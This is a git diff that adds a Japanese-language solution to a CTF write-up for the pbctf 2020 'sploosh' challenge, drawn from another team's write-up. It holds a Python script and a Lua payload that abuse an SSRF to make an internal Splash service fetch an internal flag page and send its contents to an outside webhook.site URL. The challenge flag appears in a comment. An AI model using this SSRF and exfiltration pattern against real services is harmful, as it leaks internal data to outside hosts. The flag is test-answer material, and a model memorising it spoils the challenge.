@@ -44,10 +44,55 @@ Not solved :(
 
 * https://splash.readthedocs.io/en/stable/api.html
 
-
 # Solution
 
+**[writeup]**
 
+* https://ctftime.org/writeup/25207
 
+`Splash`でLuaスクリプトを実行する。
 
+* [Splash Scripts Tutorial](https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial)
 
+実行するスクリプトは以下の通り。
+
+```lua
+function main(splash)
+    local treat = require("treat")
+    local json = splash:http_get('http://172.16.0.14/flag.php')
+    local response=splash:http_get('https://webhook.site/25760c6e-5ef1-42f7-b8e1-bae8e3abbf4b?flag='.. treat.as_string(json.body))
+end 
+```
+
+これを`execute?lua_source=`に渡せばよい。
+
+実行結果はWebhookで受け取る。今回は https://webhook.site/ を使う。
+
+```py
+import requests
+from urllib.parse import quote
+
+lua="""
+function main(splash)
+    local treat = require("treat")
+    local json = splash:http_get('http://172.16.0.14/flag.php')
+    local response=splash:http_get('https://webhook.site/25760c6e-5ef1-42f7-b8e1-bae8e3abbf4b?flag='.. treat.as_string(json.body))
+end         
+"""
+ 
+url='http://sploosh.chal.perfect.blue/api.php?url=http://splash:8050/execute?lua_source='+quote(lua)
+response=requests.get(url)
+print(response.text)
+```
+
+上記コードを実行すると、Webhookに対するリクエストを見ることができる。
+
+![](img/2020-12-07-20-24-41.png)
+
+<!-- pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s} -->
+
+## Comment
+
+Webhookを使った問題が初めてだった。
+
+また、APIドキュメントを読んでLuaスクリプトが実行できることはわかっていたが、パラメータの渡し方がわかっていなかった。
